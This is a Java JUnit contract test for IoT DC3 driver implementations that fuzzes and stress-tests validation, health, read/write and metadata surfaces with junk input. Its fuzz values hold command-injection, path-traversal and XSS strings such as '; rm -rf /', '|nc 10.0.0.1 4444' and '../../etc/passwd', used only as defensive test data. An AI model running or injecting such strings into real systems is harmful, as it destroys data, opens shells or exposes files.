/*
 * Copyright 2016-present the IoT DC3 original author or authors.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package io.github.pnoker.test.driver;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.pnoker.common.driver.entity.bean.WritePointValue;
import io.github.pnoker.common.driver.entity.bo.AttributeBO;
import io.github.pnoker.common.driver.entity.bo.DeviceBO;
import io.github.pnoker.common.driver.entity.bo.PointBO;
import io.github.pnoker.common.driver.entity.property.DriverProperties;
import io.github.pnoker.common.driver.service.DriverCustomService;
import io.github.pnoker.common.entity.dto.MetadataEventDTO;
import io.github.pnoker.common.enums.AttributeTypeEnum;
import io.github.pnoker.common.enums.MetadataOperateTypeEnum;
import io.github.pnoker.common.enums.MetadataTypeEnum;
import io.github.pnoker.common.enums.PointTypeEnum;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;

/**
 * Shared adversarial contract for driver implementations: black-box structural
 * inputs, seeded dumb fuzzing, and stress loops against the
 * {@link DriverCustomService} surface, without any real device attached.
 *
 * <p>Contract under test: drivers may reject any input, but rejections must be
 * fast and must surface as the driver exception family (anything from
 * {@code io.github.pnoker.common.exception}, plus
 * {@link IllegalArgumentException}). Leaking {@code NullPointerException},
 * array/index/cast errors, raw {@code IOException}, or hanging on adversarial
 * input is a defect, because the platform schedules drivers on a shared
 * command executor and cannot distinguish a broken device from a broken
 * driver.</p>
 *
 * <p>Hardware interactions are deliberately out of scope: every adversarial
 * case either fails before any I/O (missing configuration) or targets a port
 * that cannot connect. Each subclass binds one driver implementation, usually
 * with {@link #instantiate(Class)}.</p>
 */
public abstract class DriverAdversarialContract {

    private static final int FUZZ_ITERATIONS = 300;
    private static final int STRESS_ITERATIONS = 2000;
    private static final long CALL_TIMEOUT_SECONDS = 10;
    private static final long STRESS_BUDGET_MS = 15000;
    private static final int HUGE_STRING_LENGTH = 256 * 1024;

    private static final ExecutorService WATCHDOG = Executors.newCachedThreadPool(runnable -> {
        Thread thread = new Thread(runnable, "driver-adversarial-watchdog");
        thread.setDaemon(true);
        return thread;
    });

    private static final String[] FUZZ_KEYS = {
        "serialPort",
        "baudRate",
        "host",
        "port",
        "timeout",
        "slot",
        "interfaceName",
        "canId",
        "tagName",
        "endpoint",
        "objectId",
        "resourceId",
        "nodeIeeeAddress",
        "clusterId",
        "attributeId",
        "topic",
        "dataOffset",
        "dataLength",
        "dalHost",
        "unrelated"
    };

    private static final String[] FUZZ_VALUES = {
        "",
        "0",
        "-1",
        "2147483648",
        "-2147483649",
        "3.14",
        "NaN",
        "0x1F",
        "true",
        "%s%n%d%%",
        "${value}",
        "../../etc/passwd",
        "; rm -rf /",
        "& del /Q *",
        "$(reboot)",
        "`id`",
        "|nc 10.0.0.1 4444",
        "<script>alert(1)</script>",
        "标签测试\uD83D\uDE00",
        "null",
        "COM1",
        "/dev/ttyUSB0",
        "e \u0000 nul"
    };

    /**
     * Bind the driver implementation under test. Called once per test execution;
     * subclasses should return a cached instance.
     */
    protected abstract DriverCustomService service();

    /* ------------------------------------------------------------------
     * Structural black-box matrix (hard contract)
     * ------------------------------------------------------------------ */

    /** Schedule and driver-level health must be safe before any lifecycle ran. */
    @Test
    void scheduleAndDriverHealthAreSafeWithoutLifecycle() {
        acceptVoidRejection(() -> {
            service().schedule();
            return null;
        });
        acceptRejectionNonNull(service()::health);
    }

    /** Validation surfaces must classify junk structurally, never crash. */
    @Test
    void validationSurfacesAcceptStructurallyJunkInput() {
        for (Map<String, AttributeBO> config : structuralCases()) {
            acceptRejectionNonNull(() -> service().validate(config));
            acceptRejectionNonNull(() -> service().validateDevice(config, device()));
            acceptRejectionNonNull(() -> service().validatePoint(config, point()));
        }
    }

    /** Per-device health must answer offline/safe, never crash, on junk input. */
    @Test
    void deviceHealthFailsSafeOnJunkInput() {
        for (Map<String, AttributeBO> config : structuralCases()) {
            acceptRejectionNonNull(() -> service().health(config, device()));
        }
        acceptRejectionNonNull(() -> service().health(new HashMap<>(), null));
    }

    /** Partial metadata payloads (null enums, null ids) must be tolerated. */
    @Test
    void metadataEventsAreSafeOnPartialPayloads() {
        for (MetadataEventDTO event : List.of(
                event(null, null, 1L),
                event(MetadataTypeEnum.DEVICE, null, 1L),
                event(null, MetadataOperateTypeEnum.DELETE, null),
                event(MetadataTypeEnum.POINT, MetadataOperateTypeEnum.UPDATE, null),
                event(MetadataTypeEnum.DEVICE, MetadataOperateTypeEnum.DELETE, null))) {
            acceptVoidRejection(() -> {
                service().event(event);
                return null;
            });
        }
    }

    /** Value simulation must produce a non-null sample for every point type. */
    @Test
    void simulateAcceptsEveryPointType() {
        for (PointTypeEnum type : PointTypeEnum.values()) {
            PointBO point = point();
            point.setPointTypeFlag(type);
            acceptRejectionNonNull(() -> service().simulate(point));
        }
    }

    /** Read/write must fail with the driver exception family on junk configs. */
    @Test
    void readAndWriteFailSafeOnAdversarialConfigs() {
        DeviceBO device = device();
        PointBO point = point();
        WritePointValue writeValue =
                WritePointValue.builder().type(PointTypeEnum.STRING).value("1").build();
        for (Map<String, AttributeBO> config : structuralCases()) {
            assertDriverFailure("read/empty-family", () -> service().read(config, config, device, point));
            assertDriverFailure("write/empty-family", () -> service().write(config, config, device, point, writeValue));
        }
    }

    /* ------------------------------------------------------------------
     * Seeded dumb fuzzing (hard contract)
     * ------------------------------------------------------------------ */

    /** Seeded fuzz across the validation and health surfaces. */
    @Test
    void fuzzedValidationAndHealthStayInContract() {
        Random random = new Random(0xDC3L);
        for (int iteration = 0; iteration < FUZZ_ITERATIONS; iteration++) {
            Map<String, AttributeBO> config = fuzzConfig(random);
            int index = iteration;
            assertDriverFailure("validate#" + index, () -> service().validate(config));
            assertDriverFailure("validatePoint#" + index, () -> service().validatePoint(config, fuzzPoint(random)));
            assertDriverFailure("validateDevice#" + index, () -> service().validateDevice(config, fuzzDevice(random)));
            assertDriverFailure("health#" + index, () -> service().health(config, fuzzDevice(random)));
        }
    }

    /** Seeded fuzz over partial metadata event payloads. */
    @Test
    void fuzzedMetadataEventsStayInContract() {
        Random random = new Random(0xDC3L);
        for (int iteration = 0; iteration < 200; iteration++) {
            MetadataEventDTO event = new MetadataEventDTO();
            if (random.nextBoolean()) {
                event.setId((long) random.nextInt(4_000));
            }
            if (random.nextBoolean()) {
                event.setMetadataType(randomEnum(random, MetadataTypeEnum.class));
            }
            if (random.nextBoolean()) {
                event.setOperateType(randomEnum(random, MetadataOperateTypeEnum.class));
            }
            int index = iteration;
            assertDriverFailure("event#" + index, () -> {
                service().event(event);
                return null;
            });
        }
    }

    /* ------------------------------------------------------------------
     * Stress (hard contract)
     * ------------------------------------------------------------------ */

    /** Repeated validation rounds must stay within a fixed wall-clock budget. */
    @Test
    void validationSurfacesSustainStressWithinBudget() {
        Map<String, AttributeBO> config = junkDriverConfig();
        long start = System.nanoTime();
        for (int iteration = 0; iteration < STRESS_ITERATIONS; iteration++) {
            assertDriverFailure("stress-validate#" + iteration, () -> service().validate(config));
            assertDriverFailure("stress-point#" + iteration, () -> service().validatePoint(config, point()));
        }
        long elapsedMillis = (System.nanoTime() - start) / 1_000_000;
        assertThat(elapsedMillis)
                .as("%d validate/validatePoint rounds on %s", STRESS_ITERATIONS, driverLabel())
                .isLessThan(STRESS_BUDGET_MS);
    }

    /* ------------------------------------------------------------------
     * Helpers available to subclasses
     * ------------------------------------------------------------------ */

    /**
     * Instantiate a driver implementation reflectively: typed
     * {@link DriverProperties} plus Mockito doubles for every collaboration.
     * Constructors are tried in declaration order until one succeeds.
     */
    protected static <T> T instantiate(Class<T> implClass) {
        InvocationTargetException lastError = null;
        for (Constructor<?> constructor : implClass.getDeclaredConstructors()) {
            try {
                constructor.setAccessible(true);
                Object[] arguments = new Object[constructor.getParameterCount()];
                Class<?>[] parameterTypes = constructor.getParameterTypes();
                for (int i = 0; i < parameterTypes.length; i++) {
                    arguments[i] = argumentFor(parameterTypes[i]);
                }
                @SuppressWarnings("unchecked")
                T instance = (T) constructor.newInstance(arguments);
                return instance;
            } catch (InstantiationException | IllegalAccessException e) {
                throw new IllegalStateException("Cannot instantiate " + implClass.getName(), e);
            } catch (InvocationTargetException e) {
                lastError = e;
            }
        }
        throw new IllegalStateException(
                "No constructor of " + implClass.getName() + " could be satisfied"
                        + (lastError == null ? "" : ": " + String.valueOf(lastError.getCause())),
                lastError == null ? null : lastError.getCause());
    }

    private static Object argumentFor(Class<?> type) {
        if (type == DriverProperties.class) {
            DriverProperties properties = new DriverProperties();
            properties.setCode("AdversarialDriver");
            return properties;
        }
        if (!type.isPrimitive() && !Modifier.isFinal(type.getModifiers())) {
            return Mockito.mock(type);
        }
        try {
            return Mockito.mock(type);
        } catch (Exception e) {
            return null;
        }
    }

    private String driverLabel() {
        return service().getClass().getSimpleName();
    }

    /**
     * Run a surface that may legitimately reject junk input: a driver-family
     * exception is an accepted rejection; the raw result is returned untouched
     * (void operations legitimately produce null).
     */
    private <T> T acceptRejection(Callable<T> call) {
        try {
            return runWithWatchdog(call);
        } catch (Throwable throwable) {
            if (!isDriverException(throwable)) {
                throw driverFailure("unexpected", throwable);
            }
            return null;
        }
    }

    /**
     * Run a surface whose successful result must be usable: a driver-family
     * exception is an accepted rejection, a normal return must be non-null.
     */
    private <T> T acceptRejectionNonNull(Callable<T> call) {
        T result = acceptRejection(call);
        assertThat(result).isNotNull();
        return result;
    }

    /** Run a void surface; driver-family exceptions are accepted rejections. */
    private void acceptVoidRejection(Callable<Void> call) {
        acceptRejection(call);
    }

    private void assertDriverFailure(String operation, Callable<?> call) {
        try {
            runWithWatchdog(call);
        } catch (Throwable throwable) {
            if (!isDriverException(throwable)) {
                throw driverFailure(operation, throwable);
            }
        }
    }

    private AssertionError driverFailure(String operation, Throwable throwable) {
        return new AssertionError(
                "%s on %s leaked %s: %s"
                        .formatted(
                                operation, driverLabel(), throwable.getClass().getName(), throwable.getMessage()),
                throwable);
    }

    private <T> T runWithWatchdog(Callable<T> call) throws Exception {
        Future<T> future = WATCHDOG.submit(call);
        try {
            return future.get(CALL_TIMEOUT_SECONDS, TimeUnit.SECONDS);
        } catch (ExecutionException e) {
            if (e.getCause() instanceof Exception exception) {
                throw exception;
            }
            throw new IllegalStateException(e.getCause());
        } catch (TimeoutException e) {
            future.cancel(true);
            throw new IllegalStateException("call did not terminate within " + CALL_TIMEOUT_SECONDS + "s (hang)", e);
        }
    }

    private static boolean isDriverException(Throwable throwable) {
        return throwable instanceof IllegalArgumentException
                || throwable instanceof UnsupportedOperationException
                || throwable.getClass().getName().startsWith("io.github.pnoker.common.exception.");
    }

    private static List<Map<String, AttributeBO>> structuralCases() {
        List<Map<String, AttributeBO>> cases = new ArrayList<>();
        cases.add(new HashMap<>());
        cases.add(Map.of("unrelated", attribute("42")));
        cases.add(junkDriverConfig());
        cases.add(nullValuedConfig());
        cases.add(hugeValueConfig());
        cases.add(unicodeConfig());
        return cases;
    }

    private static Map<String, AttributeBO> junkDriverConfig() {
        Map<String, AttributeBO> config = new HashMap<>();
        config.put("serialPort", attribute("; rm -rf / #"));
        config.put("baudRate", attribute("not-a-number"));
        config.put("host", attribute("999.999.999.999"));
        config.put("port", attribute("99999999999"));
        config.put("slot", attribute("-1"));
        config.put("interfaceName", attribute("can0; shutdown -h now"));
        config.put("tagName", attribute("<script>alert(1)</script>"));
        return config;
    }

    private static Map<String, AttributeBO> nullValuedConfig() {
        Map<String, AttributeBO> config = new HashMap<>();
        config.put("serialPort", attribute(null));
        config.put("tagName", attribute(null));
        config.put("port", attribute(null));
        return config;
    }

    private static Map<String, AttributeBO> hugeValueConfig() {
        Map<String, AttributeBO> config = new HashMap<>();
        config.put("tagName", attribute("A".repeat(HUGE_STRING_LENGTH)));
        config.put("host", attribute("h".repeat(4096)));
        return config;
    }

    private static Map<String, AttributeBO> unicodeConfig() {
        Map<String, AttributeBO> config = new HashMap<>();
        config.put("tagName", attribute("标签测试\uD83D\uDE00%n%s%d"));
        config.put("serialPort", attribute("/dev/tty中文\n\r\t"));
        return config;
    }

    private static Map<String, AttributeBO> fuzzConfig(Random random) {
        Map<String, AttributeBO> config = new HashMap<>();
        int entries = 1 + random.nextInt(6);
        for (int i = 0; i < entries; i++) {
            String key = random.nextBoolean() ? FUZZ_KEYS[random.nextInt(FUZZ_KEYS.length)] : fuzzToken(random);
            AttributeTypeEnum type = random.nextBoolean() ? AttributeTypeEnum.STRING : AttributeTypeEnum.INT;
            String value = random.nextBoolean() ? FUZZ_VALUES[random.nextInt(FUZZ_VALUES.length)] : fuzzToken(random);
            config.put(key, AttributeBO.builder().value(value).type(type).build());
        }
        return config;
    }

    private static String fuzzToken(Random random) {
        int length = 1 + random.nextInt(24);
        StringBuilder token = new StringBuilder();
        for (int i = 0; i < length; i++) {
            token.append((char) (0x20 + random.nextInt(0xE0 - 0x20)));
        }
        return token.toString();
    }

    private static <T extends Enum<T>> T randomEnum(Random random, Class<T> type) {
        T[] constants = type.getEnumConstants();
        return constants[random.nextInt(constants.length)];
    }

    private static DeviceBO device() {
        DeviceBO device = new DeviceBO();
        device.setId(1L);
        return device;
    }

    private static PointBO point() {
        PointBO point = new PointBO();
        point.setId(2L);
        point.setPointTypeFlag(PointTypeEnum.STRING);
        return point;
    }

    private static DeviceBO fuzzDevice(Random random) {
        DeviceBO device = new DeviceBO();
        if (random.nextBoolean()) {
            device.setId((long) random.nextInt(4_000));
        }
        return device;
    }

    private static PointBO fuzzPoint(Random random) {
        PointBO point = new PointBO();
        if (random.nextBoolean()) {
            point.setId((long) random.nextInt(4_000));
        }
        if (random.nextBoolean()) {
            point.setPointTypeFlag(randomEnum(random, PointTypeEnum.class));
        }
        return point;
    }

    private static MetadataEventDTO event(MetadataTypeEnum metadataType, MetadataOperateTypeEnum operateType, Long id) {
        MetadataEventDTO event = new MetadataEventDTO();
        event.setMetadataType(metadataType);
        event.setOperateType(operateType);
        event.setId(id);
        return event;
    }

    private static AttributeBO attribute(String value) {
        return AttributeBO.builder().value(value).type(AttributeTypeEnum.STRING).build();
    }
}
